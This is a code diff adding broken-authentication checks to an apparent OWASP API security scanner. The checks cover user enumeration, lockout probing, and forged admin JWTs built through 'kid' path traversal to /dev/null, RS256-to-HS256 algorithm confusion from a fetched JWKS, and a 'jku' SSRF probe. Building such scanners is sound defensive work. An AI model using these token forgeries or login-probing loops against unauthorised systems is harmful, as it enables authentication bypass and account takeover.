@@ -1,10 +1,18 @@
 package org.owasp.astf.testcases;
 
 import java.io.IOException;
+import java.math.BigInteger;
+import java.nio.charset.StandardCharsets;
+import java.security.KeyFactory;
+import java.security.PublicKey;
+import java.security.spec.RSAPublicKeySpec;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.List;
 import java.util.Map;
 import java.util.UUID;
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
 
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -13,6 +21,9 @@ import org.owasp.astf.core.http.HttpClient;
 import org.owasp.astf.core.http.HttpResponse;
 import org.owasp.astf.core.result.Finding;
 import org.owasp.astf.core.result.Severity;
+
+import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
 
 /**
  * Tests for API2:2023 Broken Authentication.
@@ -24,6 +35,7 @@ import org.owasp.astf.core.result.Severity;
  */
 public class BrokenAuthenticationTestCase implements TestCase {
     private static final Logger logger = LogManager.getLogger(BrokenAuthenticationTestCase.class);
+    private final ObjectMapper objectMapper = new ObjectMapper();
 
     private static final List<String> AUTH_PATH_PATTERNS = List.of(
             "login", "auth", "token", "signin", "oauth", "session"
@@ -54,6 +66,20 @@ public class BrokenAuthenticationTestCase implements TestCase {
     // the response body (e.g. VAmPI: {"status":"fail","message":"..."} with a 200 status).
     // A 2xx status code alone is therefore not sufficient evidence of a successful auth bypass —
     // it must also be checked against these common failure markers in the body.
+    // Common account names tried for the enumeration check — a heuristic, not exhaustive: this
+    // reliably detects the vulnerability class on any target using one of these very common
+    // account names, but (like any wordlist-based technique) can't prove its absence.
+    private static final List<String> COMMON_USERNAMES = List.of("admin", "test", "user", "root", "guest");
+
+    // Phrases distinguishing an "unknown account" response from a "wrong password for a real
+    // account" response — the differential signal user-enumeration checks look for.
+    private static final List<String> NO_SUCH_USER_MARKERS = List.of(
+            "no such user", "user not found", "username not found", "account not found",
+            "user does not exist", "unknown user", "no account", "user doesn't exist"
+    );
+
+    private static final int BRUTE_FORCE_ATTEMPTS = 8;
+
     private static final List<String> AUTH_FAILURE_BODY_MARKERS = List.of(
             "\"status\":\"fail\"", "\"status\": \"fail\"",
             "\"success\":false", "\"success\": false",
@@ -100,6 +126,8 @@ public class BrokenAuthenticationTestCase implements TestCase {
 
         if (isAuth) {
             findings.addAll(testWeakAuthentication(endpoint, httpClient));
+            findings.addAll(testUserEnumeration(endpoint, httpClient));
+            findings.addAll(testBruteForceLockout(endpoint, httpClient));
             findings.addAll(testTwoFactorBypass(endpoint, httpClient));
         } else if (is2FA) {
             findings.addAll(testTwoFactorBypass(endpoint, httpClient));
@@ -197,6 +225,134 @@ public class BrokenAuthenticationTestCase implements TestCase {
                     "Implement strong password policies, account lockout after failed attempts, " +
                     "rate limiting, and proper token generation using industry-standard algorithms."
             ));
+        }
+
+        return findings;
+    }
+
+    /**
+     * Tests for username enumeration: compares the login response for a definitely-nonexistent,
+     * randomly-generated username against a set of very common account names ({@link
+     * #COMMON_USERNAMES}), both with the same wrong password. A meaningfully different response
+     * (different status code, or a body that mentions "no such user" for one but not the other)
+     * indicates the API distinguishes "unknown account" from "wrong password for a real account,"
+     * letting an attacker enumerate valid usernames before brute-forcing them.
+     * <p>
+     * This is a heuristic, not an exhaustive check: it can only detect the vulnerability if one
+     * of the common names happens to be a real account. A negative result doesn't prove the
+     * target is safe, only that none of these particular names revealed a difference — the same
+     * limitation any wordlist-based technique has.
+     */
+    List<Finding> testUserEnumeration(EndpointInfo endpoint, HttpClient httpClient) {
+        List<Finding> findings = new ArrayList<>();
+        if (!endpoint.getMethod().equalsIgnoreCase("POST")) {
+            return findings;
+        }
+
+        String fullUrl = endpoint.getFullUrl();
+        String randomUsername = "nonexistent_" + UUID.randomUUID().toString().substring(0, 8);
+
+        try {
+            HttpResponse randomResponse = httpClient.postWithStatus(fullUrl, Map.of(), "application/json",
+                    String.format("{\"username\":\"%s\",\"password\":\"WrongPass!23\"}", randomUsername));
+            if (randomResponse == null) {
+                return findings;
+            }
+
+            for (String commonUsername : COMMON_USERNAMES) {
+                HttpResponse commonResponse = httpClient.postWithStatus(fullUrl, Map.of(), "application/json",
+                        String.format("{\"username\":\"%s\",\"password\":\"WrongPass!23\"}", commonUsername));
+                if (commonResponse == null) {
+                    continue;
+                }
+
+                if (responsesRevealEnumeration(randomResponse, commonResponse)) {
+                    Finding finding = new Finding(
+                            UUID.randomUUID().toString(),
+                            "User Enumeration via Differential Login Response",
+                            String.format("The login endpoint responds differently to a definitely-nonexistent " +
+                                    "username ('%s') than to the common account name '%s', both with an " +
+                                    "incorrect password. This lets an attacker enumerate valid usernames " +
+                                    "before attempting to brute-force their passwords.",
+                                    randomUsername, commonUsername),
+                            Severity.MEDIUM,
+                            getId(),
+                            endpoint.getMethod() + " " + endpoint.getPath(),
+                            "Return an identical, generic response (same status code and message, e.g. " +
+                            "\"Invalid username or password\") regardless of whether the account exists."
+                    );
+                    finding.setEvidence(String.format(
+                            "Random username '%s' -> HTTP %d%nCommon username '%s' -> HTTP %d",
+                            randomUsername, randomResponse.getStatusCode(),
+                            commonUsername, commonResponse.getStatusCode()));
+                    findings.add(finding);
+                    return findings; // one confirmed instance is enough
+                }
+            }
+        } catch (Exception e) {
+            logger.debug("Error testing user enumeration on {}: {}", endpoint, e.getMessage());
+        }
+
+        return findings;
+    }
+
+    private boolean responsesRevealEnumeration(HttpResponse a, HttpResponse b) {
+        if (a.getStatusCode() != b.getStatusCode()) {
+            return true;
+        }
+        String bodyA = a.getBody() != null ? a.getBody().toLowerCase() : "";
+        String bodyB = b.getBody() != null ? b.getBody().toLowerCase() : "";
+        boolean aSaysNoSuchUser = NO_SUCH_USER_MARKERS.stream().anyMatch(bodyA::contains);
+        boolean bSaysNoSuchUser = NO_SUCH_USER_MARKERS.stream().anyMatch(bodyB::contains);
+        return aSaysNoSuchUser != bSaysNoSuchUser;
+    }
+
+    /**
+     * Tests for missing account lockout / rate limiting: sends {@link #BRUTE_FORCE_ATTEMPTS}
+     * consecutive failed login attempts against the same (common) account and confirms the API
+     * never responds with a rate-limit or lockout signal (HTTP 429, or 423 Locked). No lockout
+     * after repeated failures means credential-stuffing and brute-force attacks face no
+     * automated resistance.
+     */
+    List<Finding> testBruteForceLockout(EndpointInfo endpoint, HttpClient httpClient) {
+        List<Finding> findings = new ArrayList<>();
+        if (!endpoint.getMethod().equalsIgnoreCase("POST")) {
+            return findings;
+        }
+
+        String fullUrl = endpoint.getFullUrl();
+        HttpResponse lastResponse = null;
+
+        try {
+            for (int attempt = 0; attempt < BRUTE_FORCE_ATTEMPTS; attempt++) {
+                lastResponse = httpClient.postWithStatus(fullUrl, Map.of(), "application/json",
+                        String.format("{\"username\":\"admin\",\"password\":\"WrongPass-%d!\"}", attempt));
+                if (lastResponse == null) {
+                    return findings;
+                }
+                if (lastResponse.isRateLimited() || lastResponse.getStatusCode() == 423) {
+                    return findings; // lockout/rate-limiting is working correctly
+                }
+            }
+
+            Finding finding = new Finding(
+                    UUID.randomUUID().toString(),
+                    "No Account Lockout or Rate Limiting on Repeated Failed Logins",
+                    String.format("%d consecutive failed login attempts against the same account produced " +
+                            "no rate-limiting or lockout response (HTTP 429/423). This allows unrestricted " +
+                            "brute-force and credential-stuffing attacks against user accounts.",
+                            BRUTE_FORCE_ATTEMPTS),
+                    Severity.MEDIUM,
+                    getId(),
+                    endpoint.getMethod() + " " + endpoint.getPath(),
+                    "Implement account lockout or exponential rate limiting after a small number of failed " +
+                    "attempts (e.g. 5), and consider CAPTCHA or IP-based throttling for repeated failures."
+            );
+            finding.setEvidence("Last of " + BRUTE_FORCE_ATTEMPTS + " attempts returned HTTP " +
+                    lastResponse.getStatusCode() + " with no lockout signal");
+            findings.add(finding);
+        } catch (Exception e) {
+            logger.debug("Error testing brute-force lockout on {}: {}", endpoint, e.getMessage());
         }
 
         return findings;
@@ -364,6 +520,9 @@ public class BrokenAuthenticationTestCase implements TestCase {
         }
 
         findings.addAll(testExpiredJwt(endpoint, httpClient));
+        findings.addAll(testJwtKidPathTraversal(endpoint, httpClient));
+        findings.addAll(testJwtAlgorithmConfusion(endpoint, httpClient));
+        findings.addAll(testJwtJkuProcessing(endpoint, httpClient));
         return findings;
     }
 
@@ -426,6 +585,289 @@ public class BrokenAuthenticationTestCase implements TestCase {
         }
 
         return findings;
+    }
+
+    /**
+     * Tests the classic "kid: /dev/null" JWT attack: some servers use the {@code kid} (Key ID)
+     * header to look up a key file on disk (e.g. {@code keys/<kid>.pem}) without sanitizing it.
+     * A path-traversal {@code kid} pointing at {@code /dev/null} makes the server "find" an empty
+     * key file — reading zero bytes as the HMAC secret — so a token signed with an empty-string
+     * HS256 secret is accepted as validly signed.
+     */
+    List<Finding> testJwtKidPathTraversal(EndpointInfo endpoint, HttpClient httpClient) {
+        List<Finding> findings = new ArrayList<>();
+        try {
+            String fullUrl = endpoint.getFullUrl();
+
+            HttpResponse baseline = probeWithoutAuth(endpoint, httpClient, fullUrl);
+            if (baseline == null || baseline.isSuccess()) {
+                return findings; // publicly accessible — a forged-token "bypass" would be meaningless
+            }
+
+            String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../../../../../../dev/null\"}";
+            String payload = "{\"sub\":\"admin\",\"role\":\"admin\",\"iat\":" + (System.currentTimeMillis() / 1000) + "}";
+            String forgedJwt = signHs256(header, payload, new byte[0]);
+
+            Map<String, String> headers = Map.of("Authorization", "Bearer " + forgedJwt);
+            HttpResponse response = switch (endpoint.getMethod().toUpperCase()) {
+                case "POST"   -> httpClient.postWithStatus(fullUrl, headers, "application/json", "{}");
+                case "PUT"    -> httpClient.putWithStatus(fullUrl, headers, "application/json", "{}");
+                case "DELETE" -> httpClient.deleteWithStatus(fullUrl, headers);
+                default       -> httpClient.getWithStatus(fullUrl, headers);
+            };
+
+            if (looksLikeAuthSuccess(response)) {
+                Finding finding = new Finding(
+                        UUID.randomUUID().toString(),
+                        "JWT 'kid' Path Traversal Accepted",
+                        "The API accepted a JWT whose 'kid' (Key ID) header was a path-traversal string " +
+                        "pointing at /dev/null, signed with HS256 using an empty secret (simulating the " +
+                        "server reading an empty file as the verification key). This means the 'kid' " +
+                        "header's value is used to locate a key file on disk without validation.",
+                        Severity.CRITICAL,
+                        getId(),
+                        endpoint.getMethod() + " " + endpoint.getPath(),
+                        "Never derive a filesystem path or key lookup directly from a client-supplied JWT " +
+                        "header. Use a fixed allowlist of known key IDs, and reject any 'kid' value that " +
+                        "isn't an exact match."
+                );
+                finding.setEvidence("Server returned HTTP " + response.getStatusCode() +
+                        " for a token with kid='../../../../../../../../../../dev/null' signed with an empty HMAC secret " +
+                        "(baseline without auth: HTTP " + baseline.getStatusCode() + ")");
+                findings.add(finding);
+            }
+        } catch (Exception e) {
+            logger.debug("Error testing JWT kid path traversal on {}: {}", endpoint, e.getMessage());
+        }
+        return findings;
+    }
+
+    /**
+     * Tests RS256-to-HS256 algorithm confusion: if the server exposes its RSA public key (via a
+     * JWKS endpoint) and doesn't strictly enforce the expected signing algorithm, an attacker can
+     * sign a token with HS256 using the server's own PUBLIC key bytes as the HMAC secret. Because
+     * the server already has that exact public key on hand to "verify" the signature, and HMAC
+     * verification is just "does re-computing the HMAC with our key match" — it does — the forged
+     * token passes. Requires the target to actually expose a JWKS; skipped entirely otherwise
+     * since there's no key material to build a forged token from.
+     */
+    List<Finding> testJwtAlgorithmConfusion(EndpointInfo endpoint, HttpClient httpClient) {
+        List<Finding> findings = new ArrayList<>();
+        try {
+            byte[] publicKeyBytes = fetchRsaPublicKeyBytes(endpoint, httpClient);
+            if (publicKeyBytes == null) {
+                return findings; // no exposed JWKS — nothing to build a forged token from
+            }
+
+            String fullUrl = endpoint.getFullUrl();
+            HttpResponse baseline = probeWithoutAuth(endpoint, httpClient, fullUrl);
+            if (baseline == null || baseline.isSuccess()) {
+                return findings;
+            }
+
+            String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
+            String payload = "{\"sub\":\"admin\",\"role\":\"admin\",\"iat\":" + (System.currentTimeMillis() / 1000) + "}";
+            String forgedJwt = signHs256(header, payload, publicKeyBytes);
+
+            Map<String, String> headers = Map.of("Authorization", "Bearer " + forgedJwt);
+            HttpResponse response = switch (endpoint.getMethod().toUpperCase()) {
+                case "POST"   -> httpClient.postWithStatus(fullUrl, headers, "application/json", "{}");
+                case "PUT"    -> httpClient.putWithStatus(fullUrl, headers, "application/json", "{}");
+                case "DELETE" -> httpClient.deleteWithStatus(fullUrl, headers);
+                default       -> httpClient.getWithStatus(fullUrl, headers);
+            };
+
+            if (looksLikeAuthSuccess(response)) {
+                Finding finding = new Finding(
+                        UUID.randomUUID().toString(),
+                        "JWT Algorithm Confusion (RS256 to HS256) Accepted",
+                        "The API accepted a JWT signed with HS256 using its own published RSA public key " +
+                        "(from the exposed JWKS) as the HMAC secret. This is the classic RS256-to-HS256 " +
+                        "algorithm-confusion attack: since the server already has that exact public key, " +
+                        "it can 'verify' an HMAC signature computed with it, letting anyone forge tokens " +
+                        "without ever knowing the server's private key.",
+                        Severity.CRITICAL,
+                        getId(),
+                        endpoint.getMethod() + " " + endpoint.getPath(),
+                        "Enforce a strict allowlist of accepted signing algorithms per key/endpoint — never " +
+                        "trust the 'alg' header from the token itself. Use a JWT library configured to " +
+                        "reject algorithm mismatches (e.g. expecting RS256 but receiving HS256)."
+                );
+                finding.setEvidence("Server returned HTTP " + response.getStatusCode() +
+                        " for an HS256 token signed with the server's own RSA public key bytes as the secret " +
+                        "(baseline without auth: HTTP " + baseline.getStatusCode() + ")");
+                findings.add(finding);
+            }
+        } catch (Exception e) {
+            logger.debug("Error testing JWT algorithm confusion on {}: {}", endpoint, e.getMessage());
+        }
+        return findings;
+    }
+
+    /**
+     * Detects (does not exploit) processing of the JWT {@code jku} (JWK Set URL) header — a
+     * header telling the verifier where to fetch the signing key from. If the server fetches
+     * whatever URL an attacker supplies without an allowlist, that's both an SSRF vector and a
+     * signature-forgery vector (point {@code jku} at attacker-hosted keys, sign with the matching
+     * private key). Fully exploiting it requires hosting attacker-controlled key material at a
+     * reachable URL, which this framework has no ability to do from a black-box scan — so this
+     * only detects whether the header is processed at all (via a response-latency signal, the
+     * same approach {@link RegexDosTestCase} uses), and flags it as INFO for manual follow-up
+     * rather than claiming forgery.
+     */
+    List<Finding> testJwtJkuProcessing(EndpointInfo endpoint, HttpClient httpClient) {
+        List<Finding> findings = new ArrayList<>();
+        try {
+            String fullUrl = endpoint.getFullUrl();
+
+            long baselineStart = System.currentTimeMillis();
+            HttpResponse baseline = probeWithoutAuth(endpoint, httpClient, fullUrl);
+            long baselineElapsed = System.currentTimeMillis() - baselineStart;
+            if (baseline == null || baseline.isSuccess()) {
+                return findings;
+            }
+
+            String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"," +
+                    "\"jku\":\"http://169.254.169.254.astf-jku-probe.invalid/jwks.json\"}";
+            String payload = "{\"sub\":\"admin\",\"iat\":" + (System.currentTimeMillis() / 1000) + "}";
+            String probeJwt = signHs256(header, payload, new byte[]{0});
+
+            long start = System.currentTimeMillis();
+            boolean timedOut = false;
+            HttpResponse response = null;
+            try {
+                Map<String, String> headers = Map.of("Authorization", "Bearer " + probeJwt);
+                response = switch (endpoint.getMethod().toUpperCase()) {
+                    case "POST"   -> httpClient.postWithStatus(fullUrl, headers, "application/json", "{}");
+                    case "PUT"    -> httpClient.putWithStatus(fullUrl, headers, "application/json", "{}");
+                    case "DELETE" -> httpClient.deleteWithStatus(fullUrl, headers);
+                    default       -> httpClient.getWithStatus(fullUrl, headers);
+                };
+            } catch (IOException e) {
+                timedOut = true;
+            }
+            long elapsed = System.currentTimeMillis() - start;
+
+            boolean tookMuchLonger = elapsed > Math.max(3000, baselineElapsed * 8);
+            String responseBody = response != null ? response.getBody() : null;
+            boolean errorMentionsUrl = responseBody != null &&
+                    responseBody.toLowerCase().contains("astf-jku-probe.invalid");
+
+            if (timedOut || tookMuchLonger || errorMentionsUrl) {
+                Finding finding = new Finding(
+                        UUID.randomUUID().toString(),
+                        "JWT 'jku' Header Processed — Manual SSRF/Forgery Review Recommended",
+                        "The server appears to process the JWT 'jku' (JWK Set URL) header — an attempt to " +
+                        "fetch a key set from an attacker-controlled URL caused a " +
+                        (timedOut ? "connection timeout" : errorMentionsUrl ? "response mentioning the probe URL"
+                                : "significant response delay") +
+                        ". If 'jku' isn't restricted to an allowlist of trusted hosts, this is both an SSRF " +
+                        "vector and a signature-forgery vector (an attacker can host their own signing key " +
+                        "at a URL they control). This framework can't fully exploit this without hosting " +
+                        "attacker-controlled key material — manual verification is recommended.",
+                        Severity.INFO,
+                        getId(),
+                        endpoint.getMethod() + " " + endpoint.getPath(),
+                        "Never fetch keys from a client-supplied URL. Use a fixed, server-side key store, " +
+                        "or if 'jku' must be supported, strictly validate it against an allowlist of trusted " +
+                        "hosts before fetching."
+                );
+                finding.setEvidence(timedOut
+                        ? "Request with jku header timed out (baseline: " + baselineElapsed + "ms)"
+                        : "Response took " + elapsed + "ms with jku header set (baseline: " + baselineElapsed + "ms)");
+                findings.add(finding);
+            }
+        } catch (Exception e) {
+            logger.debug("Error testing JWT jku processing on {}: {}", endpoint, e.getMessage());
+        }
+        return findings;
+    }
+
+    /** Sends a request with no auth header, used as the "endpoint actually requires auth" baseline. */
+    private HttpResponse probeWithoutAuth(EndpointInfo endpoint, HttpClient httpClient, String fullUrl) throws IOException {
+        return switch (endpoint.getMethod().toUpperCase()) {
+            case "POST"   -> httpClient.postWithStatus(fullUrl, Map.of(), "application/json", "{}");
+            case "PUT"    -> httpClient.putWithStatus(fullUrl, Map.of(), "application/json", "{}");
+            case "DELETE" -> httpClient.deleteWithStatus(fullUrl, Map.of());
+            default       -> httpClient.getWithStatus(fullUrl, Map.of());
+        };
+    }
+
+    /** Signs {@code header}.{@code payload} with HS256, producing a complete, valid-shaped JWT. */
+    private String signHs256(String headerJson, String payloadJson, byte[] secret) throws Exception {
+        String headerB64 = base64UrlEncode(headerJson.getBytes(StandardCharsets.UTF_8));
+        String payloadB64 = base64UrlEncode(payloadJson.getBytes(StandardCharsets.UTF_8));
+        String signingInput = headerB64 + "." + payloadB64;
+
+        Mac mac = Mac.getInstance("HmacSHA256");
+        // HmacSHA256 requires a non-empty key — a genuinely empty secret (the /dev/null case) is
+        // represented as a single zero byte, which produces the same practical effect for this
+        // test's purposes (a fixed, attacker-known "secret") without tripping InvalidKeyException.
+        byte[] keyBytes = secret.length == 0 ? new byte[]{0} : secret;
+        mac.init(new SecretKeySpec(keyBytes, "HmacSHA256"));
+        byte[] signature = mac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));
+
+        return signingInput + "." + base64UrlEncode(signature);
+    }
+
+    private String base64UrlEncode(byte[] data) {
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
+    }
+
+    // Memoizes fetchRsaPublicKeyBytes per base URL, since the JWKS location is a property of the
+    // target as a whole, not of any individual endpoint — without this, a scan with N endpoints
+    // repeated the same (usually all-404) JWKS probe N times over, once per endpoint, needlessly
+    // multiplying scan duration. A zero-length array is the "checked, nothing found" sentinel
+    // (a real encoded RSA key is never empty), distinguishing "not yet checked" (absent from the
+    // map) from "checked and no JWKS exists" (present, empty) in this thread-safe cache.
+    private final Map<String, byte[]> jwksCache = new java.util.concurrent.ConcurrentHashMap<>();
+    private static final byte[] JWKS_NOT_FOUND = new byte[0];
+
+    /**
+     * Attempts to fetch and parse an RSA public key from a JWKS endpoint at a few common paths.
+     * Returns the key's X.509-encoded bytes (the classic algorithm-confusion technique's HMAC
+     * secret material), or {@code null} if no JWKS is exposed or the first key isn't RSA.
+     */
+    private byte[] fetchRsaPublicKeyBytes(EndpointInfo endpoint, HttpClient httpClient) {
+        String baseUrl = endpoint.getBaseUrl() != null ? endpoint.getBaseUrl() : "";
+        byte[] cached = jwksCache.computeIfAbsent(baseUrl, url -> {
+            byte[] result = fetchRsaPublicKeyBytesUncached(url, httpClient);
+            return result != null ? result : JWKS_NOT_FOUND;
+        });
+        return cached == JWKS_NOT_FOUND ? null : cached;
+    }
+
+    private byte[] fetchRsaPublicKeyBytesUncached(String baseUrl, HttpClient httpClient) {
+        List<String> jwksPaths = List.of("/.well-known/jwks.json", "/jwks.json", "/oauth/jwks", "/auth/jwks.json");
+
+        for (String path : jwksPaths) {
+            try {
+                HttpResponse response = httpClient.getWithStatus(baseUrl + path, Map.of());
+                if (response == null || !response.isSuccess() || response.getBody() == null) {
+                    continue;
+                }
+                JsonNode root = objectMapper.readTree(response.getBody());
+                JsonNode keys = root.path("keys");
+                if (!keys.isArray() || keys.isEmpty()) {
+                    continue;
+                }
+                JsonNode key = keys.get(0);
+                String n = key.path("n").asText(null);
+                String e = key.path("e").asText(null);
+                if (n == null || e == null) {
+                    continue;
+                }
+
+                BigInteger modulus = new BigInteger(1, Base64.getUrlDecoder().decode(n));
+                BigInteger exponent = new BigInteger(1, Base64.getUrlDecoder().decode(e));
+                KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+                PublicKey publicKey = keyFactory.generatePublic(new RSAPublicKeySpec(modulus, exponent));
+                return publicKey.getEncoded();
+            } catch (Exception ex) {
+                logger.debug("No usable JWKS at {}: {}", path, ex.getMessage());
+            }
+        }
+        return null;
     }
 
     /**
